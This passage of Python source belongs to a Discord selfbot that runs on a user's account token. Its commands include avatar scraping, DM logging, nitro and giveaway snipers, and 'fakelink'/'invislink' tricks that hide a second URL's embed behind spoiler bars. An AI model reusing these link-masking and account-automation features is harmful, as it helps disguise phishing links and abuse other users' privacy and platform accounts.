    if not os.path.exists(f'Data/Media/Photos/{guild1}-pfps'):
        os.mkdir(f'Data/Media/Photos/{guild1}-pfps')
    else:
        shutil.rmtree(f'Data/Media/Photos/{guild1}-pfps')
        os.mkdir(f'Data/Media/Photos/{guild1}-pfps')
    try:
        for user in users:
            with open(f'Data/Media/Photos/{guild1}-pfps/{user.id}.png', 'wb') as f:
                r = requesters.get(user.avatar, stream=True)
                for block in r.iter_content(1024):
                    if not block:
                        break
                    f.write(block)
    except Exception as f:
        print(f)

@Cheddlatron.command(description=f"Gets the link of everyone's PFP from a server. \nUsage: {config_get('prefix')}getallpfp", help="utility")
async def getallpfp(ctx):  
    logging.getLogger('discord.gateway').setLevel(logging.ERROR)  
    guild1 = ctx.guild.name
    guild1 = guild1.replace(' ', '-')
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
    delly = open(f"Data/Media/Photos/{guild1}-pfps.txt","w")
    try:
        for member in users:
            delly.write(f'{member.display_name}: {member.avatar}\n')
    except Exception as E:
        print(E)
        pass

@Cheddlatron.command(description=f"Shows info on games that are on Steam. \nUsage: {config_get('prefix')}gameinfo <game>", help="utility")
async def gameinfo(ctx, *, game):    
    r = requesters.get(urlify(f"https://api.popcat.xyz/steam?q={game}"))
    r = r.json()
    try:
        name = r["name"]
        Controller = r["controller_support"]
        web = r["website"]
        dev = r["developers"][0]
        price = r["price"]
        heading = f"{name} Info"
        body = f"Price: {price}\nDeveloper: {dev}\nWebsite: {web}\nController Support: {Controller}"
        cmdname = "Game Info"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "No Game Found"
        body = f"Could not find a game with the name '{game}'"
        cmdname = "Game Info"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Translate text to a different language. \nUsage: {config_get('prefix')}translate <language you want to translate to> <text you want to translate>", help="utility")
async def translate(ctx, lang, *, text):    
    r = requesters.get(urlify(f"https://api.popcat.xyz/translate?to={lang}&text={text}"))
    res = r.json()
    await ctx.send(f"{res['translated']}")

@Cheddlatron.command(description=f"Searches for a YouTube video. \nUsage: {config_get('prefix')}ytsearch <query>", help="utility")
async def ytsearch(ctx, *, query):    
    results = YoutubeSearch(query, max_results=1).to_json()
    char1 = results[20]
    char2 = results[21]
    char3 = results[22]
    char4 = results[23]
    char5 = results[24]
    char6 = results[25]
    char7 = results[26]
    char8 = results[27]
    char9 = results[28]
    char10 = results[29]
    char11 = results[30]
    suffix = char1 + char2 + char3 + char4 + char5 + char6 + char7 + char8 + char9 + char10 + char11
    await ctx.send(f"https://www.youtube.com/watch?v={suffix}")

@Cheddlatron.command(description=f"Searches for and plays a YouTube video. \nUsage: {config_get('prefix')}ytplay <query>", help="utility")
async def ytplay(ctx, *, query):    
    results = YoutubeSearch(query, max_results=1).to_json()
    char1 = results[20]
    char2 = results[21]
    char3 = results[22]
    char4 = results[23]
    char5 = results[24]
    char6 = results[25]
    char7 = results[26]
    char8 = results[27]
    char9 = results[28]
    char10 = results[29]
    char11 = results[30]
    suffix = char1 + char2 + char3 + char4 + char5 + char6 + char7 + char8 + char9 + char10 + char11
    webbrowser.open(f"https://www.youtube.com/watch?v={suffix}")

@Cheddlatron.command(description=f"Reads all notifications. \nUsage: {config_get('prefix')}read", help="utility")
async def read(ctx):    
    guildr = requesters.get('https://canary.discord.com/api/v9/users/@me/guilds', headers={'authorization': config_get('token')}).json()
    for guild in guildr:
        readstatelist = []
        channelsr = requesters.get(f'https://canary.discord.com/api/v9/guilds/{guild["id"]}/channels', headers={'authorization': config_get('token')}).json()
        for channel in channelsr:
            if len(readstatelist) > 90:
                ack = requesters.post('https://canary.discord.com/api/v9/read-states/ack-bulk', headers={'authorization': config_get('token')}, json_data={'read_states':readstatelist})
                readstatelist = []
                await asyncio.sleep(0.7)
            if channel['type'] == 4:
                continue
            if channel['last_message_id']:
                readstatelist.append({"channel_id":str(channel['id']),"message_id":str(channel['last_message_id']),"read_state_type":0})
        if len(readstatelist) < 1:
            continue 
        ack = requesters.post('https://canary.discord.com/api/v9/read-states/ack-bulk', headers={'authorization': config_get('token')}, json_data={'read_states':readstatelist})
        await asyncio.sleep(0.7)

@Cheddlatron.command(description=f"Creates a TinyURL for a URL. \nUsage: {config_get('prefix')}tinyurl <url>", help="utility")
async def tinyurl(ctx, url):    
    r = requesters.get(f'https://tinyurl.com/api-create.php?url={url}').text
    await ctx.send(r)

@Cheddlatron.command(description=f"Creates a custom QR code. \nUsage: {config_get('prefix')}customqr <url>", help="utility")
async def customqr(ctx, link):  
    url = f'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data={link}'  
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Changes your wallpaper to an image you attach. \nUsage: {config_get('prefix')}wallpaper <link/image embed>", help="utility")
async def wallpaper(ctx, wallpaper):    
    url = wallpaper
    r = requesters.get(url)
    name = "Data//Media//TempPicstemp.png"
    file = open(name, "wb")
    file.write(r.content)
    file.close()
    PATH = os.path.abspath(name)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
    os.remove(name)

@Cheddlatron.command(description=f"Displays latency of local Reddit Google and Discord API. \nUsage: {config_get('prefix')}ping", help="utility")
async def ping(ctx):    
    try:
        reddit_response = requested.get('https://www.reddit.com', timeout=10)
        google_response = requested.get('https://www.google.com', timeout=10)
        discord_response = requested.get('https://www.discord.com', timeout=10)
        reddit_latency = round(reddit_response.elapsed.total_seconds() * 1000)  
        google_latency = round(google_response.elapsed.total_seconds() * 1000)  
        discord_latency = round(discord_response.elapsed.total_seconds() * 1000)  
    except requested.RequestException:
        reddit_latency = 'Failed to ping Reddit.'
        google_latency = 'Failed to ping Google.'
        discord_latency = 'Failed to ping Discord.'
    local_latency = round(Cheddlatron.latency * 1000) 
    heading = "Ping Results"
    body = f"Local Ping: {local_latency}ms\nReddit Ping: {reddit_latency}ms\nGoogle Ping: {google_latency}ms\nDiscord Ping: {discord_latency}ms"
    cmdname = "Ping"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Shows a link with another hidden link used as the embed. \nUsage: {config_get('prefix')}fakelink <link you want to see> <link with the embed>", help="utility")
async def fakelink(ctx, link1, link2):    
    await ctx.send(f"{link1} ‎||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{link2}")

@Cheddlatron.command(description=f"Sends an empty message but has a link embed. \nUsage: {config_get('prefix')}invislink <link with the embed>", help="utility")
async def invislink(ctx, link2):    
    await ctx.send(f"‏‏‎‎||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{link2}")

@Cheddlatron.command(description=f"Cycles between custom statuses to disable it just run the command again. \nUsage: {config_get('prefix')}cyclestatus <status 1> <status 2>\n\nThis is also used as a two way toggle, to turn this off, do the command without any args.", help="utility")
async def cyclestatus(ctx, status1=None, status2=None):    
    with open('Data\Settings\Configs\Settings.json', 'r') as file:
        settings_data = json.load(file)
    if 'cyclestatus' not in settings_data:
        settings_data['cyclestatus'] = False
        with open('Data\Settings\Configs\Settings.json', 'w') as file:
            json.dump(settings_data, file, indent=4)
    if status1 is None or status2 is None:
        if setting_get('cyclestatus') is True:
            setting_edit("cyclestatus", False)
            heading = "Cycle Status"
            body = "Stopped Cycling Status!"
            cmdname = "Cycle Status"
            await panelmaker(ctx, heading, body, cmdname)
        else:
            heading = "Cycle Status"
            body = "Please try again with 2 statuses."
            cmdname = "Cycle Status"
            await panelmaker(ctx, heading, body, cmdname)
    else:
        setting_edit("cyclestatus", True)
        heading = "Cycle Status"
        body = "Cycle Status Starting."
        cmdname = "Cycle Status"
        await panelmaker(ctx, heading, body, cmdname)
        threading.Thread(target=cycle_statuses_thread(status1, status2)).start()

@Cheddlatron.command(description=f"Searches UrbanDictionary for a word or phrase. \nUsage: {config_get('prefix')}urban <phrase/word>", help="utility")
async def urban(ctx, *, word):    
    try:
        webthingy = urllib.request.urlopen("https://www.urbandictionary.com/define.php?term=" + word)
        hurbadurban = bs4(webthingy, "html.parser")
        definition = hurbadurban.find(class_="meaning").get_text()
        heading = "Urban Dictionary"
        body = f"Definition of: {word}\n{definition}"
        cmdname = "Urban"
        await panelmaker(ctx, heading, body, cmdname)
    except:
        heading = "Urban Dictionary"
        body = f"{word} cannot be found"
        cmdname = "Urban"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(aliases=["restart"], description=f"Restarts the selfbot. \nUsage: {config_get('prefix')}restart", help="utility")
async def reboot(ctx):
    try:
        os_name = platform.system()
        if os_name == 'Windows':
            os.startfile("Cheddlatron.exe")
            os._exit(1)
        elif os_name in ['Darwin', 'Linux']:
            os.system("./Cheddlatron.bin")
        else:
            raise NotImplementedError("Unsupported operating system")
        os._exit(1)
    except (FileNotFoundError, NotImplementedError):
        os.system("python Cheddlatron.py")
        os._exit(1)
    except Exception as e:
        await ctx.send(f"Failed to restart Cheddlatron: {e}")
        os._exit(1)

@Cheddlatron.command(aliases=["selfpurge", "purgeself", "selfclear", "clearself"], description=f"Purges a specified amount of messages sent by you in a channel or DM. \nUsage: {config_get('prefix')}purgemsg [number of messages]", help="utility")
async def purgemsg(ctx, amount: int=10):    
    async for message in ctx.channel.history(limit=amount).filter(lambda m: m.author.id == Cheddlatron.user.id).map(lambda m: m):
        try:
            await message.delete()
            await asyncio.sleep(1)
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}"+Fore.RESET)
            await send_webhook("Purge Messages Error", f"Failed to purge messages due to: {str(e)}.", config_get('error_webhook_url'))
    heading = "Purge Messages"
    body = f"{amount} messages have been purged!"
    cmdname = "purgemsg"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Changes your nitro sniper logging webhook. \nUsage: {config_get('prefix')}nitrowebhook <webhook url>", help="utility")
async def nitrowebhook(ctx, url):    
    config_edit('nitro_webhook_url', url)
    heading = "Nitro Webhook"
    body = f"Your nitro webhook has been changed!"
    cmdname = "nitrowebhook"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Changes your giveaway sniper logging webhook. \nUsage: {config_get('prefix')}giveawaywebhook <webhook url>", help="utility")
async def giveawaywebhook(ctx, url):    
    config_edit('giveaway_webhook_url', url)
    heading = "Giveaway Webhook"
    body = f"Your giveaway webhook has been changed!"
    cmdname = "giveawaywebhook"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Changes your ping logging webhook. \nUsage: {config_get('prefix')}pinglogwebhook <webhook url>", help="utility")
async def pinglogwebhook(ctx, url):    
    config_edit('pinglogger_webhook_url', url)
    heading = "Pinglogger Webhook"
    body = f"Your pinglogger webhook has been changed!"
    cmdname = "pinglogwebhook"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Changes your prefix. \nUsage: {config_get('prefix')}changeprefix <prefix>", help="utility")
async def changeprefix(ctx, prefix):    
    config_edit('prefix', prefix)
    heading = "Prefix"
    body = f"Your prefix has been changed to {prefix}"
    cmdname = "changeprefix"
    await panelmaker(ctx, heading, body, cmdname)
    Cheddlatron.command_prefix = config_get('prefix')

@Cheddlatron.command(aliases=["constheme", "ctheme"], description=f"Changes the theme of the bot. \nUsage: {config_get('prefix')}changetheme [theme]", help="utility")
async def changetheme(ctx, file=None):    
    theme_dir = "Data//Themes//"
    matched_files = glob.glob(f"{theme_dir}{file}*")
    try:
        if file == None:
            config_edit('theme', "")
            clear_console()
            terminalui()
            heading = "Change Theme"
            body = f"Theme changed to 'Cheddlatron'"
            cmdname = "changetheme"
            await panelmaker(ctx, heading, body, cmdname)             
        elif not matched_files:
            heading = "Change Theme"
            body = f"File '{file}' could not be found"
            cmdname = "changetheme"
            await panelmaker(ctx, heading, body, cmdname)
        else:
            config_edit('theme', file)
            clear_console()
            terminalui()
            heading = "Change Theme"
            body = f"Theme changed to '{file}'"
            cmdname = "changetheme"
            await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}"+Fore.RESET)
        await send_webhook("Change Theme Error", f"Failed to change theme due to: {str(e)}.", config_get('error_webhook_url'))

@Cheddlatron.command(aliases=["lst", "lsthemes"], description=f"Lists the themes in the themes folder. \nUsage: {config_get('prefix')}listthemes", help="utility")
async def listthemes(ctx):
    directory = 'Data//Themes'
    try:
        files = os.listdir(directory)
        files = [file for file in files if os.path.isfile(os.path.join(directory, file))]
        if files:
            body = "\n".join(files)
        else:
            body = "No files found."
        heading = "Themes List"
        cmdname = "listthemes"
        await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{str(e)}"+Fore.RESET)
        await send_webhook("List Themes Error", f"Failed to list themes due to: {str(e)}.", config_get('error_webhook_url'))

@Cheddlatron.command(aliases=["lsc", "lscustomcmds"], description=f"Lists the custom commands in the customcmds folder. \nUsage: {config_get('prefix')}listcustomcmds", help="utility")
async def listcustomcmds(ctx):
    directory = 'Data//CustomCmds'
    try:
        files = os.listdir(directory)
        py_files = [file for file in files if file.endswith('.py') and os.path.isfile(os.path.join(directory, file))]
        if py_files:
            body = "\n".join(py_files)
        else:
            body = "No .py files found."
        heading = "CustomCmds List"
        cmdname = "listcustomcmds"
    except Exception as e:
        body = f"Error: {e}"
        heading = "Error"
        cmdname = "listcustomcmds"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(aliases=["ethemes", "edittheme", "editthemes"], description=f"Changes web embed theme. \nUsage: {config_get('prefix')}etheme <theme>", help="utility")
async def etheme(ctx, *, theme_name: str):
    config_path = "config.json"
    try:
        with open(config_path, "r") as config_file:
            config = json.load(config_file)
    except FileNotFoundError:
        config = {}
    config["etheme"] = theme_name
    with open(config_path, "w") as config_file:
        json.dump(config, config_file, indent=4)
    heading = "Theme Changed"
    body = f"The theme has been changed to: {theme_name}"
    cmdname = "etheme"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(aliases=["lset", "listethems"], description=f"Lists the embed themes in the ethemes folder. \nUsage: {config_get('prefix')}listethemes", help="utility")
async def listethemes(ctx):
    directory = 'Data/Settings/Configs/Ethemes'
    try:
        files = os.listdir(directory)
        theme_files = [file for file in files if os.path.isfile(os.path.join(directory, file))]
        if theme_files:
            body = "\n".join(theme_files)
        else:
            body = "No theme files found."
        heading = "Ethemes List"
        cmdname = "listethemes"
    except Exception as e:
        body = f"Error: {e}"
        heading = "Error"
        cmdname = "listethemes"
    await panelmaker(ctx, heading, body, cmdname)

def format_duration(seconds):
    hours, remainder = divmod(seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    formatted_duration = ''
    if hours:
        formatted_duration += f"{hours}h "
    if minutes:
        formatted_duration += f"{minutes}m "
    if seconds or not formatted_duration:
        formatted_duration += f"{seconds}s"
    return formatted_duration.strip()

def format_unix_timestamp(timestamp):
    return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')

@Cheddlatron.command(aliases=['remind'], description=f"Sets a reminder. \nUsage: {config_get('prefix')}reminder <time (10s, 10m, 10h, 10d)> <reminder message>", help="utility")
async def reminder(ctx, time: str, *, reminder: str):
    if ctx.guild is not None:
        try:
            await ctx.message.delete()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[{get_time()}] Reminder Set! {Fore.WHITE}{reminder} ~ was set for {time}"+Fore.RESET)

    time_regex = re.compile(r"(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?")
    match = time_regex.fullmatch(time)
    if not match:
        return await ctx.send("Invalid time format. Please use `d` for days, `h` for hours, `m` for minutes, `s` for seconds.")

    days, hours, minutes, seconds = match.groups(default=0)
    delay = timedelta(days=int(days), hours=int(hours), minutes=int(minutes), seconds=int(seconds)).total_seconds()

    if delay <= 0:
        return await ctx.send("You must specify a time in the future.")

    reminder_time = datetime.utcnow()
    heading = "Reminder Set!"
    body = f"{reminder} was set for {time}"
    cmdname = "Reminder"
    await panelmaker(ctx, heading, body, cmdname)

    await asyncio.sleep(delay)

    elapsed_time = datetime.utcnow() - reminder_time
    elapsed_seconds = int(elapsed_time.total_seconds())
    elapsed_str = format_duration(elapsed_seconds)

    webhook_message = {
        "username": load_Webhooks_config()['Webhook_Username'],
        "avatar": load_Webhooks_config()['Webhook_Avatar'],
        "embeds": [{
            "title": "Chedminder Set!",
            "description": f"Reminder: {reminder}\n\n Period of time: Set **{elapsed_str}** ago.",
            "footer": {"text": f"Chedminder Command"},
            "thumbnail": {"url": load_Webhooks_config()['Webhook_Image']},
            "color": load_Webhooks_config()['Webhook_Colour']
        }]
    }

    webhook_url = config_get('dmlogger_webhook_url')
    response = requesters.post(webhook_url, json_data=webhook_message)

    if response.status_code == 200:
        print("Reminder successfully sent to the webhook.")

    ping_message = {
        "content": f"Chedminder - {ctx.author.mention}",
        "username": load_Webhooks_config()['Webhook_Username'],
        "avatar": load_Webhooks_config()['Webhook_Avatar']
    }

    response = requesters.post(webhook_url, json_data=ping_message)

    if response.status_code == 200:
        print("User ping sent to the webhook.")

@Cheddlatron.command(description=f"Toggles Discord Rich Presence on and off. \nUsage: {config_get('prefix')}rpc [config name]", help="utility")
async def rpc(ctx, name=None):
    if name is None or name is None and config_get('rpc') == "":
        config_edit('rpc', "")
        heading = "RPC Toggle"
        body = "Discord Rich Presence is now disabled."
        cmdname = "rpc"
        await panelmaker(ctx, heading, body, cmdname)
        await retardpresence()
    elif name is not None:
        config_path = f"Data/rpc_configs/{name}.json"
        if os.path.exists(config_path):
            config_edit('rpc', name)
            heading = "RPC Toggle"
            body = "Discord Rich Presence is now enabled."
            cmdname = "rpc"
            await panelmaker(ctx, heading, body, cmdname)
            await retardpresence()
        else:
            heading = "RPC Toggle"
            body = f"RPC config {name}.json does not exist in Data/rpc_configs."
            cmdname = "rpc"
            await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Creates a config file for RPC. \nUsage: {config_get('prefix')}cfgrpc <name> <Title> <Description> <Large Image> \n<Small Image> <Large Image Text> <Small Image Text> <Status> <State> <Subtext> <Timer: (True/False)> <Watch_Url> [Button Label 1] [Button Url 1] [Button Label 2] [Button Url 2]", help="utility")
async def cfgrpc(ctx, name: str, title: str, description: str, largeimg: str, smallimg: str, largeimgtext: str, smallimgtext: str, status: str, state: str, subtext: str, timer: bool, watchurl: str, buttonlabel1: str=None, buttonurl1: str=None, buttonlabel2: str=None, buttonurl2: str=None):
    if name == "":
        heading = "Error"
        body = "Please provide a name for your config."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return

    rpcdata = {
        "Title": title,
        "Description": description,
        "Large_Image": largeimg,
        "Small_Image": smallimg,
        "Large_Image_Text": largeimgtext,
        "Small_Image_Text": smallimgtext,
        "Status": status,
        "State": state,
        "SubText": subtext,
        "Timer": timer,
        "Watch_Url": watchurl,
        "Buttons": []
    }
    if buttonlabel1 and buttonurl1:
        newjson = {
            "label": buttonlabel1,
            "url": buttonurl1
        }
        rpcdata['Buttons'].append(newjson)

    elif buttonlabel2 and buttonurl2:
        newjson = {
            "label": buttonlabel2,
            "url": buttonurl2
        }
        rpcdata['Buttons'].append(newjson)

    with open(f'Data/rpc_configs/{name}.json', 'w') as f:
        json.dump(rpcdata, f, indent=4)
        heading = "Config Created!"
        body = f"RPC Config called '{name}' created!"
        cmdname = "cfgrpc"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Creates a config for console rpc. \nUsage: {config_get('prefix')}consolerpc <name> <Title> <Description> <Subtext>\n<Large Image> <Small Image> <Large Image Text>\n<Small Image Text> <Status> <Timer: (True/False)> <Platform>", help="utility")
async def consolerpc(ctx, name: str, title: str, description: str, subtext: str, largeimg: str, smallimg: str, largeimgtext: str, smallimgtext: str, status: str, timer: bool, platform: str):
    if platform[0].lower() != "x" and platform[0].lower() != "p":
        heading = "Invalid Platform"
        body = "Please either input playstation or xbox for platform."
        cmdname = "consolerpc"
        await panelmaker(ctx, heading, body, cmdname)
        return
    rpcdata = {
    "Title": title,
    "Description": description,
    "SubText": subtext,
    "Large_Image": largeimg,
    "Small_Image": smallimg,
    "Large_Image_Text": largeimgtext,
    "Small_Image_Text": smallimgtext,
    "Status": status,
    "Timer": timer,
    "Platform": platform
    }
    with open(f'Data/rpc_configs/{name}.json', 'w') as f:
        json.dump(rpcdata, f, indent=4)
        heading = "Config Created!"
        body = f"Console RPC Config called '{name}' created!"
        cmdname = "consolerpc"
        await panelmaker(ctx, heading, body, cmdname)
    


@Cheddlatron.command(description=f"Creates a config for spotify rpc. \nUsage: {config_get('prefix')}scfgrpc <name> <SongTitle> <ArtistName> <AlbumName> <Image> <Song Length (number)> <status>\n<Buttons (True/False)> <albumid>", help="utility")
async def scfgrpc(ctx, name: str,songtitle: str, artistname: str, albumname: str, image: str, songlength: int, status: str, buttons: bool, albumid: str):
    rpcdata = {
        "SongTitle": songtitle,
        "ArtistName": artistname,
        "AlbumName": albumname,
        "Image": image,
        "SongLength": songlength,
        "Status": status,
        "Buttons": buttons,
        "albumid": albumid
    }
    with open(f'Data/rpc_configs/{name}.json', 'w') as f:
        json.dump(rpcdata, f, indent=4)
        heading = "Spotify RPC Config Created!"
        body = f"Spotify RPC Config called '{name}' created!"
        cmdname = "scfgrpc"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Toggles pinglogger on and off. \nUsage: {config_get('prefix')}pinglogger", help="utility")
async def pinglogger(ctx):    
    if config_get('pinglogger') == True:
        config_edit('pinglogger', False)
        heading = "Pinglogger Toggle"
        body = "Pinglogger is now disabled."
        cmdname = "pinglogger"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('pinglogger') == False:
        config_edit('pinglogger', True)
        heading = "Pinglogger Toggle"
        body = "Pinglogger is now enabled."
        cmdname = "pinglogger"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Toggles giveaway sniper on and off. \nUsage: {config_get('prefix')}gsniper", help="utility")
async def gsniper(ctx):    
    if config_get('giveaway_sniper') == True:
        config_edit('giveaway_sniper', False)
        heading = "Giveaway Sniper Toggle"
        body = "Giveaway Sniper is now disabled."
        cmdname = "gsniper"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('giveaway_sniper') == False:
        config_edit('giveaway_sniper', True)
        heading = "Giveaway Sniper Toggle"
        body = "Giveaway Sniper is now enabled."
        cmdname = "gsniper"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Toggles nitro sniper on and off. \nUsage: {config_get('prefix')}nsniper", help="utility")
async def nsniper(ctx):    
    if config_get('nitro_sniper') == True:
        config_edit('nitro_sniper', False)
        heading = "Nitro Sniper Toggle"
        body = "Nitro Sniper is now disabled."
        cmdname = "nsniper"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('nitro_sniper') == False:
        config_edit('nitro_sniper', True)
        heading = "Nitro Sniper Toggle"
        body = "Nitro Sniper is now enabled."
        cmdname = "nsniper"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Toggles AFK Mode on and off. \nUsage: {config_get('prefix')}afkmode", help="utility")
async def afkmode(ctx):    
    if config_get('afkmode') == True:
        config_edit('afkmode', False)
        heading = "AFK Toggle"
        body = "Afk Mode is now disabled."
        cmdname = "afkmode"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('afkmode') == False:
        config_edit('afkmode', True)
        heading = "Afk Toggle"
        body = "Afk Mode is now enabled."
        cmdname = "afkmode"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Toggles webhook notifications on and off. \nUsage: {config_get('prefix')}webhooknotifs", help="utility")
async def webhooknotifs(ctx):    
    if config_get('webhooknotifs') == True:
        config_edit('webhooknotifs', False)
        heading = "Webhook Notification Toggle"
        body = "Webhook notifications are now disabled."
        cmdname = "webhooknotifs"
        await panelmaker(ctx, heading, body, cmdname)
    elif config_get('webhooknotifs') == False:
        config_edit('webhooknotifs', True)
        heading = "Webhook Notification Toggle"
        body = "Webhook notifications are now enabled."
        cmdname = "webhooknotifs"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Switches your embed mode between web embeds and indent embeds. \nUsage: {config_get('prefix')}embedmode <embed mode (web/indent)>", help="utility")
async def embedmode(ctx, mode): 
    if mode.lower() != "web" and mode.lower() != "indent" and mode.lower() !="app":
        heading = "ERROR"
        body = "You did not use a valid mode.\nPlease use either 'indent' or 'web'"
        cmdname = "ERROR"  
        await panelmaker(ctx, heading, body, cmdname)
    else:
        config_edit('embed_mode', mode)
        heading = "Embed Mode"
        body = f"Now using {mode} embeds!"
        cmdname = "embedmode"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Changes the message to be sent whilst AFK Mode is active. \nUsage: {config_get('prefix')}afkmsg <message>", help="utility")
async def afkmsg(ctx, *, msg):
    config_edit('afkmsg', msg)
    heading = "AFK Msg"
    body = f"AFK Message changed to: {msg}"
    cmdname = "afkmsg"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Logs a users DMs to you. \nUsage: {config_get('prefix')}dmlog <@user>", help="utility")
async def dmlog(ctx, user: discord.User):
    setting_edit('dmlogid', user.id)
    if user.id in setting_get('dmlogid'):
        heading = "DM Logger"
        body = f"{user.name}'s DM's now being logged!"
        cmdname = "dmlog"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "DM Logger"
        body = f"{user.name}'s DM's no longer being logged!"
        cmdname = "dmlog"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Removes a paywall from a website. \nUsage: {config_get('prefix')}removepaywall <url>", help="utility")
async def removepaywall(ctx, url):    
    webbrowser.open(f"https://12ft.io/proxy?ref=&q={url}")

@Cheddlatron.command(aliases = ["cls", "clear"], description=f"Clears the console. \nUsage: {config_get('prefix')}clearcons", help="utility")
async def clearcons(ctx):    
    clear_console()
    terminalui()
    heading = "Clear Console"
    body = "Console has been cleared!"
    cmdname = "clearcons"
    await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Sends a temp email link. \nUsage: {config_get('prefix')}tempmail", help="utility")
async def tempmail(ctx):    
    await ctx.send(f'https://www.tempinbox.xyz/mailbox/{random.randint(0, 8)}@tempinbox.xyz')

@Cheddlatron.command(description=f"Generates a random name. \nUsage: {config_get('prefix')}genname", help="utility")
async def genname(ctx):    
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@Cheddlatron.command(description=f"Displays info about a user. \nUsage: {config_get('prefix')}whois <@user>", help="utility")
async def whois(ctx, member: Union[discord.Member, discord.User] = None):   
    async def get_mutual_guilds(member, guild):
        try:
            if await guild.fetch_member(member.id) is not None:
                return guild.name
        except discord.NotFound:
            pass
    mutual_guilds = []
    tasks = [get_mutual_guilds(member, guild) for guild in Cheddlatron.guilds]
    results = await asyncio.gather(*tasks)
    mutual_guilds.extend(filter(None, results))
    mutual_servers = '\n'.join(mutual_guilds) if mutual_guilds else "None"
    if isinstance(ctx.channel, discord.TextChannel):  
        if member is None:
            member = ctx.message.author
        heading = f"Who Is {member.display_name}"
